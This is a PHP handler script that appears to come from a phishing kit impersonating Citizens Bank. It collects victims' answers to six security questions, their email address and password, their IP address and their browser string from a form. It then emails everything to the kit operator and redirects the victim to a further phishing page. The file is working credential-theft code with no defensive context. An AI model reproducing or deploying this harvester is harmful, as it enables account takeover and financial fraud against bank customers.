<?php include 'send.php';?>
<?php

$ip = getenv("REMOTE_ADDR");
$timestamp = date('d/m/Y h:i:s');
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-------------->B33LL XOUTH Citizens Bank - ReZulT (3)<------------------\n";
$message .= "Question1: ".$_POST['q1']."\n";
$message .= "Ans: ".$_POST['ans1']."\n";
$message .= "Question2: ".$_POST['q2']."\n";
$message .= "Ans: ".$_POST['ans2']."\n";
$message .= "Question3: ".$_POST['q3']."\n";
$message .= "Ans: ".$_POST['ans3']."\n";
$message .= "Question4: ".$_POST['q4']."\n";
$message .= "Ans: ".$_POST['ans4']."\n";
$message .= "Question5: ".$_POST['q5']."\n";
$message .= "Ans: ".$_POST['ans5']."\n";
$message .= "Question6: ".$_POST['q6']."\n";
$message .= "Ans: ".$_POST['ans6']."\n\n";
$message .= "||-------->Email Access<--------||\n";
$message .= "Email: ".$_POST['Email']."\n";
$message .= "Password: ".$_POST['Pass']."\n\n";

$message .= "Time: $timestamp \n";
$message .= "User-Agent: $browser \n";
$message .= "IP Info: https://geoiptool.com/en/?ip=".$ip."\n";
$message .= "----------- -By B33LL XOUTH----------\n";

$subject = "Citizens Bank Questions/Email (3)😈 INFO FROM 😈- $ip";
$headers = "";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "\n";
	 mail("", "B33LL XOUTH ", $message);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location:email2.php");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?> 